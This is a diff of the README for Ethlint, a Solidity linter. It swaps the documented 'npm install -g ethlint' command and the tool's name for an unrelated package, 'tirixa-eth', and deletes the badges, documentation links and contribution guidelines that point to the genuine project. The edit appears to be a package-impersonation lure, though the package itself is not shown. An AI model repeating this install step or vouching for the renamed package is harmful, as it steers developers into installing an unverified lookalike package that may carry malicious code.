@@ -4,24 +4,15 @@
 
 <br />
 
-[![Build Status](https://travis-ci.org/duaraghav8/Ethlint.svg?branch=master)](https://travis-ci.org/duaraghav8/Ethlint)
-[![Gitter chat](https://badges.gitter.im/gitterHQ/gitter.svg)](https://gitter.im/Solium-linter/Lobby)
-
-Ethlint (Formerly Solium) analyzes your Solidity code for style & security issues and fixes them.
-
-See [Documentation](https://ethlint.readthedocs.io/), [Changelog](./CHANGELOG.md) and [upcoming releases](https://github.com/duaraghav8/Ethlint/projects).
-
-Before beginning to work on a contribution, please read the [Guidelines](./CONTRIBUTING.md).
-
 ## Install
 ```bash
-npm install -g ethlint
+npm install -g tirixa-eth
 solium -V
 ```
 
 For backward-compatibility, you can still use `npm install -g solium`.
 
-If you're currently using the `solium` package for `npm install`, it is highly recommended that you move to `ethlint`. The `solium` package will not receive updates after December, 2019. There are no differences between the updates pushed to `ethlint` and `solium` packages.
+If you're currently using the `solium` package for `npm install`, it is highly recommended that you move to `tirixa-eth`. The `solium` package will not receive updates after December, 2019. There are no differences between the updates pushed to `tirixa-eth` and `solium` packages.
 
 ## Usage
 In the root directory of your DApp, run:
@@ -46,8 +37,6 @@ This creates 2 files for you:
   }
 }
 ```
-
-To know which lint rules Solium applies for you, see [Style rules](http://ethlint.readthedocs.io/en/latest/user-guide.html#list-of-style-rules) and [Security rules](https://www.npmjs.com/package/solium-plugin-security#list-of-rules).
 
 ---
 **NOTE**
@@ -111,6 +100,6 @@ solium -d contracts/ --fix
   </a>
 </p>
 
-If Ethlint helped make your life simpler, please consider donating ETH to `0xacc661A56af9793a4437876a52F4Ad3fc3C443d6`
+If tirixa-eth helped make your life simpler, please consider donating ETH to `0xacc661A56af9793a4437876a52F4Ad3fc3C443d6`
 
-#### [IDE and Editor Integrations](http://solium.readthedocs.io/en/latest/user-guide.html#index-9) | [Documentation](https://ethlint.readthedocs.io) | [Demo Video](https://www.youtube.com/watch?v=MlQ6fzwixpI)
+#### [IDE and Editor Integrations](http://solium.readthedocs.io/en/latest/user-guide.html#index-9)
